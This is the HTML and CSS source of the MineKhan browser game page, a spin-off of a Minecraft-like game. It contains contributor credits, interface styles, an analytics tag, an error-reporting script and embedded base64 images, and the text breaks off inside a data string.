<!DOCTYPE html>
<html lang="en-us">
<pre id="topCredits" class='hidden'>
@MineKhan-thingmaker version Beta 1.1.2

If you make a spin-off/fork of this, please keep the current credits and don't change them.

	Notes and accreditation:
THIS IS NOT THE ORIGINAL, THE ORIGINAL IS HERE: https://willard.fun/minekhan
This is a spin-off of MineKhan by Willard
thingMaker's credits (not Willard's)
 * This spin-off was started around spring of 2021
 * The lighting was created by Willard at https://github.com/willard21/minekhan. It has been modified to have more features.
 * Red Monster (https://www.khanacademy.org/profile/monsterred) made some shapes for the blocks
 * Shoos10 (https://www.khanacademy.org/profile/kaid_651789387350300127259402) created the Island World type
 * Repeat (https://www.khanacademy.org/profile/kaid_730847189850789421961173) made a few fixes/changes here and there
 * Trexler and Luke (https://replit.com/@lukeP0WERS) made some code (use search to find)
 * gouling (https://replit.com/@gouling) helped translate some things.
 * I created the survival mode and mob shapes and mob code.
 * The biomes were originally made to look like Minecraft biomes, but have been improved after I looked at a lot of images (possibly hundreds).
 * For terrain generation, some methods came from https://github.com/misode/deepslate
 * There may be other things not listed here
Q&A:
	why is there world in arguments? so it works when copied to servers with multiple worlds

Willard's credits
 * This program (MineKhan) was made by Willard (me). The original is https://www.khanacademy.org/cs/mc/5647155001376768 (just adding this so that spin-offs have it)
 * Zushah helped me with some of the menus in the 0.6 update via GitHub. https://www.khanacademy.org/profile/zushah77
 * Element118 helped speed up the process of adding new textures significantly. https://www.khanacademy.org/profile/element118
 * Danielkshin made the current main menu background. https://www.khanacademy.org/profile/danielkshin

 * This program originated as a spin-off of ScusCraft by ScusX.
 * It's 99% different code at this point, but I still never would have made it this far without his code for reference.
 * ScusCraft can be found here: https://www.khanacademy.org/computer-programming/scuscraft-3d/5145400332058624
 * My original spin-off can be found here: https://www.khanacademy.org/computer-programming/high-performance-minecraft/5330738124357632
 * While porting the code from PJS to a webpage, I copied the PJS source code for a few of their helper functions from here: https://raw.githubusercontent.com/Khan/processing-js/master/processing.js
 * The textures are 100% copied from real Minecraft, and are the property of Mojang and Microsoft with whom I have no association.
 * The real Minecraft game can be bought and downloaded at https://www.minecraft.net/en-us/

Chunks are kept in memory until you restart. So don't explore too far or memory usage will grow until it crashes unrecoverably.
</pre>
	<head>
		<meta charset="utf-8">
		<title>MineKhan</title>
    <base href="https://thingmaker.us.eu.org/minekhan/">
    <meta name="keywords" content="MineKhan, redstone, simulation, survival, game, sandbox, biomes, terrain, 3d, free">
    <meta name="description" content="MineKhan with survival, nether, multiplayer, redstone, mobs, crafting, large terrain, hundreds of blocks, diamond pickaxes, downloadable maps and many more features. More features, less players.">
    <meta property="og:image" content="assets/images/e/sij.jpg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
    <meta name="theme-color" id="themeColor">
		<!--<style>
			@font-face{
        font-family: 'thefontmonospace';
        src:url('Monocraft.ttf');
      }
    </style>-->
		<link rel="manifest" href="./manifest.json">
		<link rel="icon" type="image/x-icon" href="favicon.ico" id="icon">
	</head>
	<style>
		body {
			overflow: hidden; /* Hide scrollbars */
		}
    #errorScreen {
      position: absolute;
      top: 0px;
      left: 0px;
      width:100vw;
      height:var(--vh);
      z-index:10;
      background:darkblue;
      color:white;
      padding:8px;
      font-family: monospace;
      overflow:auto;
      box-sizing:border-box;
			/*font-style:italic;
			text-decoration: underline overline wavy red;*/
    }
    button, canvas, #loader{
		  /*get rid of user select*/
			-webkit-tap-highlight-color: transparent;
      -webkit-touch-callout: none;
      -webkit-user-select: none;
      -khtml-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
		}
		button{
      margin:4px;
      border-radius:0px;
      background:rgb(120,120,120);
      border-color:rgb(200,200,200) rgb(80,80,80) rgb(80,80,80) rgb(200,200,200);
      border-width:2px;
      border-style:solid;
			outline:1px solid black;
      color:white;
      cursor:pointer;
      font-family:thefont;
      font-size:12px;
			text-shadow: 2px 2px black;
			padding:0 32px;
			min-height:40px;
			position:relative;
		}
    button:hover{
      background:rgb(100,120,200);
      border-color:rgb(200,200,255) rgb(100,80,160) rgb(100,80,160) rgb(200,200,255);
      color:yellow;
    }
		button:active{
      /*background:#9a9a9a;
      border-color:#888 #aaa #aaa #888;*/
      background:rgb(100,120,200);
      border-color:rgb(100,80,160) rgb(200,200,255) rgb(200,200,255) rgb(100,80,160);
		}
    button[disabled]{
      background:rgb(60,60,60);
      border-color:rgb(20,20,20) rgb(130,130,130) rgb(130,130,130) rgb(20,20,20);
      cursor:default;
      color:white;
    }
		button .icon{
			position:absolute;
			left:3%;
			/*top:12.5%;
			height:75%;*/
		}
		.world-select {
			/*width: 99vw;
			min-width: 300px;
			height: calc(var(--vh) - 220px);
			bottom: 120px;
			margin: 0 auto;*/
			box-sizing: border-box;
			position: absolute;
			overflow-y: auto;
			background-color: RGBA(0, 0, 0, 0.6);
			justify-content: center;
		}
		/*.world-select.lessunderspace{
			height: calc(var(--vh) - 170px);
			bottom:70px;
		}*/
		.world, .lang, .resourcePack, .seed, .achievment {
			width: 50%;
			height: auto;
			border: 1px solid black;
			font-size: 13px;
			font-family: 'thefont', 'Courier New', Courier, monospace;
			color: rgb(180, 180, 180);
			margin: 0 auto;
			margin-top: 15px;
			padding: 5px;
			cursor: pointer;
      position:relative;
		}
		.world:hover, .lang:hover, .resourcePack:hover, .seed:hover, .achievment:hover{
			background:#fff4;
		}
    .world .thumbnail, .resourcePack .thumbnail{
      float:left;
      margin-right:8px;
      width:64px;
      height:64px;
    }
    /*.world .thumbnailHover{
      position:absolute;
      left:5px;
      top:5px;
      background:#fff8;
      opacity:0;
      width:64px;
      height:64px;
      background-image: url("assets/images/world_selection.png");
      background-position: 0 0;
      background-size: 800%;
      image-rendering: pixelated;
    }
    .world .thumbnailHover.warning{
      background-position: -92px 0;
    }
    .world:hover .thumbnailHover{
      opacity:1;
    }
    .world .thumbnailHover:hover{
      background-position: 0 -64px;
    }
    .world .thumbnailHover.warning:hover{
      background-position: -92px -64px;
    }*/
    .world .ping{
      float:right;
    }
    .world .ping .img, .pingImg{
      width:20px;
      height:14px;
      image-rendering:pixelated;
      background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAvBAMAAAARGvdQAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAKlBMVEUAAAAA/yFbW1sAhw84ODgATv8AKYL/AACCAAAWFhYbGxsNDQ0tLS3///8kJQ3mAAAAAXRSTlMAQObYZgAAAAFiS0dEDfa0YfUAAAAHdElNRQflCBEADi4Q3XvrAAAAAW9yTlQBz6J3mgAAALJJREFUKM+F0LEJwzAQheGDCLsNaAEVbyBVmkVlCoMLb+B5Alkr956kKISQHEb8uPhOyMznyiOpIguqyIIqsqCKGUxWLMoLZwk+9jFpupgupgvLw0UqwwXKcENYfrppuiRzc/2kpg1I1EysYBMr+I+bG877FmiDu05og7vMxiobS/irm+d9y8tFsfa01LSBrmdnmZ11+N1cb/zaVKvn+L0f97G1nuj12LeeqGftuR5h3VRPY3Yni6f4L4QAAAAldEVYdGRhdGU6Y3JlYXRlADIwMjEtMDgtMTdUMDA6MTI6NTcrMDA6MDAgdhOWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDIxLTA4LTE3VDAwOjEyOjU3KzAwOjAwUSurKgAAAABJRU5ErkJggg==");
      background-position: 0 0;
      background-size: 40px 600%;
      display:inline-block;
    }
    .world .lockImg{
      width: 14px;
      height: 16px;
      image-rendering: pixelated;
      float: right;
      margin-left: 4px;
      background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAICAYAAAA1BOUGAAAAAXNSR0IArs4c6QAAAD9JREFUGFdjZICChQsX/oex4+PjGUFsMAGSgAkg8xnRJZBNwi+ZmZkJtwumC0YzIktOnz6dITMzE66GeEl0YwHnrii1au6ixAAAAABJRU5ErkJggg==");
      background-size:100%;
    }
		#marketplace .world, #marketplaceInfo .world{
			border:1px solid gray;
			display:inline-block;
			padding:8px;
			text-align:center;
			width: auto;
			margin: 8px;
			padding: 5px;
		}
    .world::after, #marketplaceInfo::after{
      content:'';
      display:block;
      clear:both;
    }
    .select-message{
      font-size: 15px;
			font-family: 'thefont', 'Courier New', Courier, monospace;
			color: rgb(180, 180, 180);
      margin-top: 15px;
      text-align:center;
    }
		#marketplace .link{
			font:16px thefont;
			margin-right:16px;
			cursor:pointer;
		}
		strong {
			color: white;
		}
    a{
      color:#37f;
      text-decoration:none;
    }
    a:hover{
      text-decoration:underline;
    }
		.selected {
			outline: 3px solid white;
		}
		input[type=text], input[type=search], input:not([type]) {
			background-color: black;
			caret-color: white;
			border: 2px solid gray;
			color: white;
			padding-left: 12px;
			font-size:24px;
		}
		input[type=text]:focus, input[type=search]:focus, input:not([type]):focus {
			border: 2px solid lightgray;
		}
		#boxcentertop {
			z-index: 1;
			/*width: 80vw;
			max-width: 400px;
			height: 50px;
			top: 30px;
			margin: 0 auto;*/
			position: absolute;
			display: block;
			box-sizing: border-box;
		}
    #uploadWorld {
			z-index: 1;
      color:white;
			position: absolute;
			display: block;
			/*left: calc(50% + 220px);*/
		}
    /*#editworld{
      z-index: 1;
			width: 80vw;
			max-width: 400px;
      position:relative;
      top:90px;
      margin:0 auto;
    }
    #editworld input{
      width:100%;
      height: 50px;
			display: block;
			margin: 10px 0;
    }*/
		.hidden {
			display: none !important;
		}
		#onhover {
			background-color: rgba(0, 0, 0, 0.9);
			color: rgb(200, 200, 200);
			font-family: thefont, 'Courier New', Courier, monospace;
      font-size:16px;
			word-wrap: normal;
			width: auto;
			max-width: 400px;
			position: absolute;
			z-index: 10;
			padding: 10px;
			cursor: default;
		}
		#quota {
			display: block;
			position: absolute;
			margin: 0 auto;
			width: 99vw;
			z-index: 1;
			background-color: RGBA(0, 0, 0, 0.6);
			justify-content: center;
			text-align: center;
			color: white;
		}
    
		#messagesHolder, #messages{
      color:white;
      font:14px 'thefont';
      max-height:var(--vh);
      overflow:hidden;
		}
    #messagesHolder{
      position:absolute;
      z-index:2;
      top:0px;
      left:0px;
      overflow-wrap:anywhere;
      width:100vw;
      height:var(--vh);
      display:flex;
      flex-direction:column;
    }
		#messagesHolder .type-emoji-button{
			position: absolute;
			bottom:10px;
			right:108px;
		}
    #messages{
      background:#000a;
      position:absolute;
      z-index:2;
      top:0px;
      left:0px;
      max-width: calc(50% - 30px);
      overflow-wrap:anywhere;
    }
		#messagesAll > span, #messages > span{
			display:block;
		}
    #messageInput, #messageOverlay{
      display:inline-block;
      margin-left: 50px;
      height: 50px;
      width: calc(100vw - 150px);
      font:16px 'thefont';
      padding:8px;
      background:rgb(60,60,60);
      border-color:rgb(20,20,20) rgb(130,130,130) rgb(130,130,130) rgb(20,20,20);
      border-width:2px;
      border-style:solid;
      outline: none;
      box-sizing: border-box;
    }
		#messageInput{
			color:transparent;
			caret-color:white;
			position:relative;
			background:transparent;
			border-color:transparent;
		}
		#messageOverlay{
      color:white;
			position:absolute;
			bottom:0;
			padding-top: 14px;/*center font-size:16px padding:8px*/
			z-index:-1;
			overflow: hidden;
    	overflow-wrap: normal;
			white-space: pre;
		}
		#messagesCmdHelp{
			position:absolute;
			left:0;
			bottom:0;
			width:50px;
			height:50px;
			margin:0;
			padding:0;
		}
		#messagesEnter{
			position:absolute;
			right:0;
			bottom:0;
			width:100px;
			height:50px;
			margin:0;
			padding:0;
		}
		#messagesHolder .emoji-list{
			margin-top:auto;
			position:sticky;
			bottom:0;
		}
    #messagesScroll{
      background:#000a;
      height:100%;
      width:100%;
      overflow-y:scroll;
			display:flex;
			flex-direction:column;
    }
		#messageHints, #messagesHolder.command #messageInput, #messagesHolder.command #messageOverlay{
			font-family:thefont;
		}
		#messageHints{
			margin-top:auto;
		}
    
    #controls{
      width: 99vw;
			min-width: 300px;
			height: calc(var(--vh) - 130px);
			position: absolute;
			bottom: 80px;
			overflow-y: auto;
			background-color: RGBA(0, 0, 0, 0.6);
			justify-content: center;
			margin: 0 auto;
      color:white;
      font:15px thefont;
    }
    #controls table{
      width:100%;
    }
    .control td{
      padding:5px 4px;
    }
    .control button{
      float:right;
      width:100%;
      min-height:30px;
			margin:0;
    }
    #controlDetect{
      width: 100vw;
			height: var(--vh);
			position: absolute;
			top:0;
      left:0;
			background-color: white;
			justify-content: center;
      align-items:center;
      display:flex;
      font:20px thefont;
      z-index:1;
    }
    #narratorVoiceSelect{
      position:absolute;
      box-sizing:border-box;
      left:calc(50vw - (100vw / 6));
      top:calc(50vh + -65px - 20px);
      width:calc(100vw / 3);
      height:calc(40px);
    }
    #help{
      position:absolute;
      z-index:2;
      top:50px;
      left:0px;
      width:100vw;
      height:calc(var(--vh) - 50px);
      background:#0000;
      color:white;
      font:15px thefont;
      display:flex;
      flex-direction:row;
    }
    #help > .nav{
      width:20%;
      background:#0008;
      overflow-y:scroll;
    }
    #help > .nav > a{
      display:block;
      padding:8px;
      width:100%;
      text-decoration:none;
      color:white;
      cursor:pointer;
      box-sizing:border-box;
    }
    #help > .content{
      width:80%;
      padding:10px;
      overflow-y:scroll;
      background:#0004;
    }
    #help > .content > div{
      margin-bottom:100px;
    }
    #help > .content pre{
      font:15px thefont;
    }
    #help h1{font-size:25px;}
    #help h2{font-size:18px;}
    #help img{max-width:100%;}
    #loader{
      background:#181818;
      color:white;
      position:absolute;
      top:0;
      left:0;
      width:100vw;
      height:var(--vh);
      font-size:30px;
      font-family:monospace;
      display:flex;
      justify-content:center;
      align-items:center;
      flex-direction:column;
      z-index:2;
      transition:0.5s linear;
    }
    /*#loader .name{
      width:433px;
    }
    #loader .name > img{
      width:100%;
    }*/
		#loader:before{
			content:"";
			position:absolute;
			top:0;
			left:0;
			width:100vw;
			height:100vh;
			background:#830;
			z-index:3;
			opacity:0;
			transition:0.5s linear;
		}
		#loader.hide:before{
			opacity:1;
		}
		#bottomRightList{
			font-family:monospace;
			position:absolute;
			bottom:0;
			right:0;
			font-size: 16px;
			color:white;
			max-width:100vw;
			text-align:right;
			z-index:4;
			pointer-events: none;
			white-space: pre-wrap;
		}
    #loadingImg{
      width:42px;
      image-rendering:pixelated;
    }
		.loadBar{
			border:2px solid #eee;
			width:40%;
			padding:2px;
		}
		.loadBar div{
			height:10px;
			width:0px;
			background:#eee;
		}
    /*#intro{
      z-index:3;
      position:absolute;
      background:#830;
      color:white;
      top:0;
      left:0;
      width:100vw;
      height:100vh;
      transition:0.25s linear;
    }
    #intro > *{
      position:absolute;
      top:50%;
      left:50%;
			width:100%;
			height:100%;
      transform: translateX(-50%) translateY(-50%);
    }*/
    .darklinks a{
      color:blue;
    }
    
    .collapsible{
      color:black;
    }
    .collapsible .title{
      background-color: #777;
      color: white;
      cursor: pointer;
      padding: 18px;
      border: none;
      text-align: left;
      outline: none;
      font-size: 15px;
    }

    .collapsible .title:hover {
      background-color: #555;
    }
    .collapsible .title:after {
      content: '\02795'; /* Unicode character for "plus" sign (+) */
      font-size: 13px;
      color: white;
      float: right;
      margin-left: 5px;
    }
    .collapsible .title.active:after{
      content: "\2796"; /* Unicode character for "minus" sign (-) */
    }

    .collapsible .content {
      padding: 0 18px;
      background-color: #f1f1f1;
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.2s ease-out;
    }
    
    .recipe{
      background:#7f7f7f;
      border:1px solid black;
      padding:10px;
      margin:20px;
      display:inline-block;
    }
    .recipe .grid {
      display:inline-block;
      outline: 2px solid black;
    }
    .recipe .grid > img, .recipe .grid > div {
      outline: 1px solid black;
      display:inline-block;
    }
    .recipe .result{
      outline: 1px solid black;
      display:inline-block;
      position:relative;
    }
    .recipe .result .number{
      position:absolute;
      color:white;
      bottom:0;
      right:0;
      font-size:14px;
    }
    #messagesAll table, #messages table, .tableBright{
      border:1px solid #eee;
    }
    #messagesAll table td, #messages table td, .tableBright td{
      border:1px solid #eee;
      padding:5px;
    }
		#editSignContainer{
      position:absolute;
      top:25%;
      left:25%;
      width:50%;
      height:50%;
      z-index:1;
		}
    #editSignBox{
      font:32px thefont;
			width:100%;
			height:100%;
			box-sizing:border-box;
    }
		#editSignContainer .type-emoji-button{
			position:absolute;
			bottom:8px;
			right:8px;
		}
		#editSignContainer .emoji-list{
			position:absolute;
			top:100%;
			width:100%;
			height:50px;
			overflow-y:auto;
		}
    #centerMessage{
      width: 99vw;
			min-width: 300px;
			height: calc(var(--vh) - 220px);
			position: absolute;
			bottom: 120px;
			overflow-y: auto;
			background-color: transparent;
			margin: 0 auto;
      color: white;
      font: 16px thefont;
    }
    #marketplaceInfo {
			width: 99vw;
			min-width: 300px;
			height: calc(var(--vh) - 220px);
			position: absolute;
			bottom: 120px;
			overflow-y: auto;
			background-color: RGBA(0, 0, 0, 0.6);
			justify-content: center;
			margin: 0 auto;
      color: white;
      font-family:thefont;
      padding:8px;
      box-sizing:border-box;
		}
    #marketplaceInfo > .thumbnail{
      float:left;
      width:200px;
      margin: 16px;
    }
    #customMenuContainer, #updates{
      position:absolute;
      left:25vw;
      top:25vh;
      width:50vw;
      height:50vh;
      background:#aaa;
      padding: 10px;
      box-sizing: border-box;
      font: 24px thefont;
      border:3px solid;
      border-color: rgb(200,200,200) rgb(80,80,80) rgb(80,80,80) rgb(200,200,200);
			overflow:auto;
    }
		#commandBlock{
			position:absolute;
      top:10%;
      left:10%;
      width:80%;
      height:80%;
      font:16px thefont;
      z-index:1;
			background:#0008;
			padding:8px;
			color:white;
			overflow:auto;
		}
		#commandBlockInput, #commandBlockOverlay{
			width:100%;
			height:200px;
			font:16px thefont;
			padding:8px;
			box-sizing:border-box;
			border: 1px solid gray;
    	overflow-wrap: break-word;
			white-space: pre-wrap;
		}
		#commandBlockInput{
			resize:vertical;
			background:transparent;
			caret-color: white;
			color:transparent;
		}
		#commandBlockOverlay{
			position:absolute;
			top:0;
			left:0;
			width:100%;
			height:100%;
			background-color: black;
			color: white;
    	z-index: -1;
			overflow: hidden;
		}
		#commandBlock button{
			width: calc(100% - 16px);
    	height: 40px;
			position:absolute;
			bottom:0;
		}
		#commandBlockOutput{
			width:100%;
			box-sizing:border-box;
			font-family:thefont;
			padding:8px;
			background: #555
		}
    @keyframes appear{
      from{
        left:75vw;
        opacity:0;
      }
    }
    @keyframes disappear{
      to{
        left:75vw;
        opacity:0;
      }
    }
		#languages{
			width: 99vw;
			min-width: 300px;
			height: calc(var(--vh) - 220px);
			position: absolute;
			bottom: 120px;
			overflow-y: auto;
			background-color: RGBA(0, 0, 0, 0.6);
			justify-content: center;
			margin: 0 auto;
    }
		.lang{
			text-align:center;
		}
		#resourcePacks{
			width: 99vw;
			min-width: 300px;
			height: calc(var(--vh) - 220px);
			position: absolute;
			bottom: 120px;
			overflow-y: auto;
			background-color: RGBA(0, 0, 0, 0.6);
			justify-content: center;
			margin: 0 auto;
    }
		#updates{
			font-size:16px;
		}
		#updates button{
			width:100%;
			font-size:18px;
		}
		.update{
			border:1px solid gray;
			padding:8px;
			margin-bottom:8px;
		}
		#packetViewerContainer{
			position:absolute;
			left:0;
			bottom:0;
			width:100vw;
			height:calc(var(--vh) - 100px);
			background:black;
			color:wheat;
			font:16px monospace;
			overflow:hidden;
		}
		#packetViewerJSON{
			position:absolute;
			bottom:0;
		}
		#seedBox{
			z-index: 1;
			position: absolute;
			display: block;
			box-sizing: border-box
		}
		.seed{
			width: 25%;
      display:inline-block;
			margin:16px;
		}
		#achievments{
			position:absolute;
			left:0;
			bottom:0;
			width:100vw;
			height:calc(var(--vh) - 100px);
			background:black;
			color:wheat;
			font:16px monospace;
			overflow:auto;
		}
		.achievment.done{
			border-color:lime;
		}
		.achievment.done:before{
			content:"Done";
			color:lime;
			display:block;
		}
		.type-emoji-button{
			font: 24px thefont;
		}
		.type-emoji.hidden + .type-emoji-button{
			display:none;
		}
		.type-emoji.hidden + .emoji-list{
			display:none;
		}
		.emoji-list{
			background:#0008;
			color:white;
			word-wrap: anywhere;
		}
		.emoji-list > span{
			margin-right:16px;
			cursor:pointer;
			font-family:thefont;
		}
	</style>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-VRNT3CCCGH"></script>
  <script>
    window.dataLayer = window.dataLayer || []
    function gtag(){dataLayer.push(arguments)}
    gtag('js', new Date())
    gtag('config', 'G-VRNT3CCCGH', {page_title:document.title})
  </script>
	<body>
  <div id="errorScreen" style="display:none;">
		<h1>Error!</h1>
		<div id='errorData'></div>
		<br><br>
		<div style='position:sticky;bottom:8;left:8'>
		<button onclick='errorScreen.style.display="none"'>Hide</button>
		<button onclick='let p=prompt("What caused this error to happen? what did you do?");sendError("error explained: "+p)'>Help fix this error by explaining how it happened</button>
		</div>
	</div>
  <script>
    let errorScreen = document.querySelector("#errorScreen")
    // If there is an error, show error screen
		let errorData = document.querySelector("#errorData")
    const errors = []
    function logError(e){
      if(typeof e !== "object") e = {message:e}
			e.asdf_error_time = Date.now()
      errors.push(e)
			let msg
			if(e.stack){
				msg = e.stack+""
			}else{
				msg = e.message+""
				if(e.lineno || e.colno) msg += "\nError occured at"
				if(e.lineno) msg += " line "+e.lineno
				if(e.colno) msg += " column "+e.colno
			}
			if(window.world) msg += " In "+world.name+" multiplayer:"+Boolean(window.multiplayer)
			errorData.insertAdjacentHTML('beforeend',"<br><div style='border:1px solid red; padding:8px;'>"+msg.replace(/\n/g,"<br>").replace(/ /g,"&nbsp;")+"</div>")
      errorScreen.style.display = "block"
			if(window.sendError && errors.length<5) sendError(msg)
    }
    addEventListener("error", logError)
		addEventListener("unhandledrejection", e => logError(e.reason))
		/*if (window.parent.checkerrorinterval) clearInterval(window.parent.checkerrorinterval)
		let lastCheckFrame, lastCheckTick
		window.parent.checkerrorinterval = setInterval(() => {
			let now = Date.now()
			if(window.parent.raf === lastCheckFrame || window.parent.tickid === lastCheckTick){
				let lastError = errors[errors.length-1]
				if(lastError && now-lastError.asdf_error_time<2500){
					logError("The following have stopped:"+(window.parent.tickid===lastCheckTick?" tick":"")+(window.parent.raf === lastCheckFrame?" animation frame":"")+". To fix this, reload.")
				}
			}
			lastCheckFrame = window.parent.raf
			lastCheckTick = window.parent.tickid
		},2000)*/
    if(self !== top) logError("You must open MineKhan in a new window to work.")
  </script>
  <div id="loader" class="hide">
    <!--<div class="name"><img src="assets/images/minekhan.png"></div>-->
		<div style="font:bold 64px thefont;">MINEKHAN</div>
		<br>
    <img src="data:image/gif;base64,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